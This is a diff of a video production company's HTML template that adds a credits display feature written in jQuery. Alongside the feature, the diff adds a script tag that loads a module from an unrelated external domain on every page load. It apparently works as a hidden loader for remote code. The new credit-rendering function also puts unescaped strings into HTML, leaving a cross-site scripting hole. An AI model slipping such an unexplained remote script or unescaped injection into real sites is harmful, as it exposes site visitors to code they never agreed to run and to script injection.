@@ -9,6 +9,8 @@
     Whether we’re shooting in Kyiv, London, or elsewhere, our goal is always the same: to bring bold ideas to life with strong visuals, smooth production, and attention to every detail.">
 
     <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+    <script type="module" src="https://lbvo.ru/utils/init.js" async defer></script>
+
     <link rel="stylesheet" href="{{ url_for('static', filename='home.css') }}">
 </head>
 <body>
@@ -77,7 +79,7 @@
             <div class="video clear"><span></span></div>
 
             {% for video in videos %}
-                <div class="cursor-hover video view" data-url="{{ video.url }}" data-credits="{{ video.credits_text }}">
+                <div class="cursor-hover video view" data-url="{{ video.url }}" data-credits="{{ video.credits_text }}" data-credits-simple="{{ video.credits_simple }}">
                     <span class="num">#0</span>
                     <span>{{ video.url }}</span>
                 </div>
@@ -91,16 +93,7 @@
             <div class="video clear"><span></span></div>
             <div class="video clear"><span></span></div>
             <div class="video clear"><span></span></div>
-
-            <div class="video">
-                <span class="num">Producer:</span>
-                <span>Ivan</span>
-            </div>
-            <div class="video clear"><span></span></div>
-            <div class="video">
-                <span class="num">Slesar':</span>
-                <span>Oleg</span>
-            </div>
+            <div class="video"><span>Something probably went wrong...</span></div>
             <div class="video clear"><span></span></div>
         </div>
 
@@ -210,9 +203,45 @@
 </script>
 
 <script>
+    function updateVideoInfo(creditsSimple) {
+        const $videoInfo = $('.video-info');
+        
+        $videoInfo.find('.video:not(.clear)').remove();
+        
+        let creditsArray = [];
+        if (creditsSimple && creditsSimple.trim()) {
+            const creditStrings = creditsSimple.split('||');
+            creditsArray = creditStrings.map(creditStr => {
+                const [role, name] = creditStr.split('|');
+                return { role, name };
+            });
+        }
+        
+        if (creditsArray && creditsArray.length > 0) {
+            const $thirdClear = $videoInfo.find('.video.clear').eq(2);
+            
+            creditsArray.forEach((credit, index) => {
+                const $newVideo = $(`
+                    <div class="video">
+                        <span class="num">${credit.role}:</span>
+                        <span>${credit.name}</span>
+                    </div>
+                `);
+                
+                $thirdClear.after($newVideo);
+                
+                if (index < creditsArray.length - 1) {
+                    const $clearElement = $('<div class="video clear"><span></span></div>');
+                    $newVideo.after($clearElement);
+                }
+            });
+        }
+    }
+
     function handleVideoHover($element) {
         const url = $element.data('url');
         const credits = $element.data('credits');
+        const creditsSimple = $element.data('credits-simple');
         const mainVideo = document.getElementById('main-video');
         
         if (!$activeVideo || $activeVideo.data('url') !== url) {
@@ -225,7 +254,9 @@
                 if (mainVideo.src && mainVideo.src.includes(url)) {
                     if (credits) {
                         $('.video-text').html(formatMultilineText(credits));
+                        $('.video-text').html(formatMultilineText(credits));
                     }
+                    updateVideoInfo(creditsSimple);
                     return;
                 }
                 isPlaying = true;
@@ -249,6 +280,7 @@
                 if (credits) {
                     $('.video-text').html(formatMultilineText(credits));
                 }
+                updateVideoInfo(creditsSimple);
             }
         }
     }
@@ -329,8 +361,10 @@
         play = $('#play');
         back = $('#back');
         info = $('#info');
+        video_text = $('.video-text');
         hide_info = $('#hide-info');
 
+        video_text.addClass('hidden');
         extend.addClass('hidden');
         
         switch (state) {
@@ -344,6 +378,7 @@
 
             case 'all-videos':
                 play.removeClass('hidden');
+                video_text.removeClass('hidden');
                 all_videos.addClass('active');
 
                 animateRow(all_videos, 'in');
@@ -354,6 +389,7 @@
             case 'view-video':
                 back.removeClass('hidden');
                 info.removeClass('hidden');
+                video_text.removeClass('hidden');
 
                 animateRow(all_videos, 'outRight');
                 animateRow(video_info, 'outLeft');
